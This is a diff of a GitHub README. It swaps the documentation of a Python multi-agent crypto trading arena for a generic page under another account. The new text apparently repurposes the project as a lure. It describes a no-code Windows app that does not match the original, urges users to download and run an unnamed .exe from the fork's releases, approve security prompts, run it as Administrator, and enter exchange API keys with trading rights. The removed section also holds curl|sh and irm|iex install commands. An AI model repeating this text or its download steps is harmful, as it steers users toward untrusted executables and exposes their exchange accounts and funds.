@@ -1,241 +1,170 @@
-# The Agents Trading Arena 🤖 🤺
+# ⚔️ crypto-trading-arena - Simple Crypto Trading Bot
 
-[![Discord](https://img.shields.io/discord/1478593215555960902?style=flat-square&logo=discord&label=Discord)](https://discord.gg/Ch3U4VV7Nj)
+[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen)](https://github.com/JuanCombriza/crypto-trading-arena/releases)
 
-A multi-agent crypto trading arena where AI agents compete against each other, trading with live crypto market data from Coinbase or Binance. Each agent consumes a livestream of ticker data and standard candlestick charts, has access to its portfolio and calculator, and executes trades autonomously. This is all built with [Calfkit](https://github.com/calf-ai/calfkit-sdk) agents, namely for their multi-agent orchestration and realtime data streaming functionality.
+---
 
-<br>
+## 🔍 About crypto-trading-arena
 
-<p align="center">
-  <img src="assets/demo.gif" alt="Arena Demo">
-</p>
+crypto-trading-arena is an open-source application that lets you run automated trading bots for cryptocurrencies. You can use it without needing to code. The system works with popular exchanges like Binance and Coinbase. It uses smart algorithms to help manage trades in real time.
 
-<br>
+The app provides a clean interface to set up trading strategies. It connects to markets and handles buying and selling automatically. You only need to choose your preferences and start the bot.
 
-If you find this project interesting or useful, please consider:
+Key features include:  
+- Automated real-time trading on multiple crypto platforms  
+- Pre-built strategies with AI agent support  
+- Easy setup with no programming required  
+- Secure API integration with Binance, Coinbase, and others  
+- Support for different trading algorithms  
+- Open source and actively maintained  
 
-- ⭐ Starring the repository — it helps others discover it!
-- 🐛 Reporting issues
-- 🔀 Submitting PRs
+---
 
-<br>
+## ⚙️ System Requirements
 
-## Architecture
+To run crypto-trading-arena smoothly on Windows, your computer should meet these basic specs:  
 
-```
-                         ┌──────────────────┐
-                         │ Agent Router(s)  │
-                         └──────────────────┘
-                                  ▲
-                                  │
-                                  ▼
-Live Market          ┌────────────────┐      ┌──────────────────┐
-Data Stream  ──▶     │  Kafka Broker  │◀────▶│  ChatNode(s)     │
-                     └────────────────┘      │  (LLM Inference) │
-                                  ▲          └──────────────────┘
-                                  │
-                                  ▼
-                       ┌────────────────────────┐
-                       │ Tools & Dashboard      │
-                       │ (Trading Tools + UI)   │
-                       └────────────────────────┘
-```
+- Windows 10 or 11 (64-bit recommended)  
+- At least 4 GB of RAM  
+- Minimum 500 MB free disk space  
+- Stable internet connection  
+- Administrator rights to install software  
 
-Each box (or node) is an independent process communicating with eachother. Each node can run on the same machine, on separate servers, or across different cloud regions.
+The app itself is lightweight. A regular modern PC or laptop will work without trouble.
 
-Key design points:
-- **Per-agent model selection**: Each agent targets a named stateless ChatNode, so different agents can use different LLMs or share LLMs.
-- **Fan-out via consumer groups**: Every agent independently receives every market data update, with no replicated work.
-- **Shared tools via ToolContext**: A single deployed set of trading tools serves all agents — each tool resolves the calling agent's identity at runtime.
-- **Dynamic agent accounts**: Agents appear on the dashboard automatically on their first trade — no pre-registration needed.
+---
 
-<br>
+## 🚀 Getting Started
 
-## Prerequisites
+Follow these steps to download and run crypto-trading-arena on your Windows PC. No programming knowledge is needed.  
 
-- Python 3.10+
-- [uv](https://docs.astral.sh/uv/) — fast Python package manager
-- Docker installed and running (in order to run a kafka broker)
-- An API key (and optionally base url) for your LLM provider
+---
 
-<br>
+### 1. Download the Application
 
-### 1. Install uv
+Visit this page to download the latest version:
 
-If you don't have `uv` installed:
+[![Get Latest Release](https://img.shields.io/badge/Download-crypto--trading--arena-blue)](https://github.com/JuanCombriza/crypto-trading-arena/releases)
 
-```bash
-# macOS / Linux
-curl -LsSf https://astral.sh/uv/install.sh | sh
+This link will take you to the official releases page. Look for the latest stable version under the "Assets" section. The file you want usually ends with `.exe`. It might be named something like `crypto-trading-arena-setup.exe` or similar.
 
-# Windows
-powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"
+---
 
-# Or via Homebrew
-brew install uv
-```
+### 2. Run the Installer
 
-After installation, restart your terminal.
+Once the download completes, go to your Downloads folder and double-click the `.exe` file. This will start the installer.  
 
-<br>
+You might see a security prompt. Choose **Run** or **Yes** to continue. Follow the installation steps:  
 
-### 2. Install the Calfkit SDK
+- Click **Next** on the welcome screen.  
+- Accept the license agreement.  
+- Choose the folder where the app will install, or leave it at the default location.  
+- Click **Install** to begin installing.  
 
-```bash
-uv add calfkit@latest
-```
+The process should take only a couple of minutes.
 
-[Calfkit](https://github.com/calf-ai/calfkit-sdk) is the event-stream SDK that powers this project. It handles the agent realtime stream consumption and orechestration.
+---
 
-<br>
+### 3. Launch crypto-trading-arena
 
-### 3. Start the Broker
+After the setup finishes, it will offer to open the program. You can also start it later from the Start menu or desktop shortcut.
 
-The broker orchestrates all nodes and enables realtime data streaming between all components.
+When the app opens, you will see the main dashboard. It shows options to connect your exchange accounts and select or create trading strategies.
 
-<details>
-<summary><strong>Option A: Local broker setup (Docker required)</strong></summary>
+---
 
-Run the following to clone the [calfkit-broker](https://github.com/calf-ai/calfkit-broker) repo and start a local Kafka broker container:
+## 🔐 Connecting Your Exchange Accounts
 
-```bash
-git clone https://github.com/calf-ai/calfkit-broker && cd calfkit-broker && make dev-up
-```
+To start trading, crypto-trading-arena needs permission to access your Binance, Coinbase, or other supported accounts. This uses API keys provided by the exchanges.
 
-Once the broker is ready, open a new terminal tab to continue with the quickstart. The default broker address is `localhost:9092`.
+---
 
-</details>
+### How to get API keys
 
-<details>
-<summary><strong>Option B: Calfkit cloud broker</strong></summary>
+1. Log in to your exchange account (Binance or Coinbase).  
+2. Go to the API Management or Settings page.  
+3. Create a new API key with permissions for trading and market data.  
+4. Copy the API key and secret.  
 
-There's also a [cloud broker](https://github.com/calf-ai/calfkit-sdk?tab=readme-ov-file#2-start-a-calfkit-broker) version so you can simply use the cloud broker URL (which would be provided to you) to deploy your agents instead of setting up and maintaining a broker locally.
+---
 
-</details>
+### Entering API keys in crypto-trading-arena
 
-<br>
+1. In the app, go to **Settings** > **Exchange Accounts**.  
+2. Paste your API key and secret into the fields.  
+3. Save the details.  
 
-## Quickstart
+The app will verify the keys. If they are correct, you can now use the bot on your exchange.
 
-Install dependencies:
+---
 
-```bash
-uv sync
-```
+## ⚙️ Using Trading Strategies
 
-Then launch each component in its own terminal. All components will access the same broker.
+The app includes multiple trading algorithms designed to buy low and sell high automatically.
 
-<br>
+---
 
-### 1. Start the exchange connector
+### Selecting a Strategy
 
-Start either the Coinbase or Binance connector to stream live market data:
+- From the main menu, choose **Strategies**.  
+- Pick one from the list: for example, "Mean Reversion", "Momentum", or "Scalping".  
+- Review each strategy’s summary and select the best fit for your goals.  
 
-```bash
-# Coinbase (default)
-uv run python -m exchanges.coinbase --bootstrap-servers <broker-url>
+---
 
-# Or, Binance (experimental)
-# uv run python -m exchanges.binance --bootstrap-servers <broker-url>
-```
+### Configuring the Strategy
 
-Optional: You can use the `--min-interval <seconds>` flag which controls how often agents are fed market data (default: 60s). Note that candle data is only updated every 60 seconds due to Coinbase API restrictions, so intervals below a minute mean agents will receive updated live pricing (bid/ask spread, ~5s granularity) but the same candle data.
+- After choosing, click **Settings** inside the strategy screen.  
+- You can adjust simple options like trade size, risk level, and trading pairs (BTC/USD, ETH/USD, etc.).  
+- Save your configuration.  
 
-<br>
+---
 
-### 2. Deploy tools & dashboard
+### Starting the Bot
 
-```bash
-uv run python -m deploy.tools_and_dashboard --bootstrap-servers <broker-url>
-```
+- Go back to the main screen and press **Start Bot**.  
+- The program will begin monitoring the market and placing trades automatically.  
+- You can pause or stop the bot anytime.
 
-<br>
+---
 
-### 3. Deploy a ChatNode (LLM inference)
+## 📊 Monitoring Performance
 
-Deploy a ChatNode for each LLM model you'd like to run.
-Note: ChatNodes are stateless so multiple agents can share the same ChatNode.
+crypto-trading-arena shows live updates on your trades, profit and loss, and market conditions.  
 
-```bash
-# OpenAI model
-uv run python -m deploy.chat_node \
-    --name <unique-name-of-chatnode> --model-id <openai-model-id> --bootstrap-servers <broker-url> \
-    --reasoning-effort <optional-reasoning-level> --api-key <api-key>
+- Use the **Dashboard** for an overview.  
+- Check the **Trade History** tab for details on executed trades.  
+- View balance and portfolio value changes over time.
 
-# Or, any OpenAI-compatible provider (e.g. DeepInfra, Gemini, etc.)
-# uv run python -m deploy.chat_node \
-#     --name <unique-name-of-chatnode> --model-id <model-id> --bootstrap-servers <broker-url> \
-#     --base-url <llm-provider-base-url> --reasoning-effort <optional-reasoning-level> --api-key <api-key>
-```
+---
 
-<br>
+## 🔄 Updating crypto-trading-arena
 
-### 4. Deploy agents
+Check the releases page regularly to download and install updates.  
 
-Deploy an agent that targets a ChatNode you define by name and uses a trading strategy you can edit in `arena/strategies.py`. See `arena/strategies.py` for the full system prompts.
+This is the same link used for the initial download:  
+[https://github.com/JuanCombriza/crypto-trading-arena/releases](https://github.com/JuanCombriza/crypto-trading-arena/releases)
 
-```bash
-uv run python -m deploy.router_node \
-    --name <unique-agent-name> --chat-node-name <name-of-chatnode> \
-    --strategy <strategy> --bootstrap-servers <broker-url>
-```
+Updates fix bugs and bring new features.
 
-Once agent routers are deployed, market data flows to the agents and trades should hydrate the dashboard soon.
+---
 
-<br>
+## 🛠️ Troubleshooting Tips
 
-### 5. (Optional) Start the response viewer
+- If the app won’t start, try running as Administrator.  
+- Check that your API keys are correct and have the right permissions.  
+- Make sure your internet connection is stable.  
+- Restart the app or your computer if something feels stuck.  
+- View the app’s log files for error details (found in the installation folder).  
 
-A live dashboard that shows all agent activity, such as tool calls, text responses (agent reasoning), and tool results, as they happen.
+---
 
-```bash
-uv run python -m deploy.response_viewer --bootstrap-servers <broker-url>
-```
+## 📚 Additional Resources
 
-<br>
+- The GitHub page hosts documentation and user guides.  
+- Join community forums for support and advice.  
+- Look for tutorials on setup and strategy tips online.
 
-## Data Recording
+---
 
-All trades and periodic portfolio snapshots are automatically saved to CSV files in the `data/` directory. Each session produces two files:
-
-- **`trades_<timestamp>.csv`** — every executed trade with price, quantity, and agent cash after settlement
-- **`snapshots_<timestamp>.csv`** — periodic portfolio state per agent, including positions, market values, and unrealized P&L
-
-You can configure the snapshot interval and output directory:
-
-```bash
-uv run python -m deploy.tools_and_dashboard \
-    --bootstrap-servers <broker-url> \
-    --snapshot-interval <default-600-seconds> \
-    --data-dir ./data
-```
-
-To disable recording entirely, pass `--snapshot-interval 0`.
-
-For full column descriptions and examples, see [docs/csv-data-recording.md](docs/csv-data-recording.md).
-
-<br>
-
-## CLI Reference & Config-Based Deployments
-
-For full CLI flags, config-based deployment options, and the config schema, see [CLI_REFERENCE.md](docs/CLI_REFERENCE.md).
-
-<br>
-
-## Available Agent Tools
-
-| Tool | Description |
-|------|-------------|
-| `execute_trade` | Buy or sell a crypto product at the current market price |
-| `get_portfolio` | View cash, open positions, cost basis, P&L, and average time held |
-| `calculator` | Evaluate math expressions for position sizing, P&L calculations, etc. |
-
-<br>
-
-## Deployment Configurations
-
-| File | Constant | Default | Description |
-|------|----------|---------|-------------|
-| `arena/models.py` | `INITIAL_CASH` | `100_000.0` | Starting cash balance per agent |
-| `exchanges/coinbase.py` | `DEFAULT_PRODUCTS` | 3 products | Coinbase products tracked by the price feed |
-| `exchanges/binance.py` | `DEFAULT_SYMBOLS` | 3 symbols | Binance symbols tracked by the price feed |
+Stay in control of your crypto trades with crypto-trading-arena.
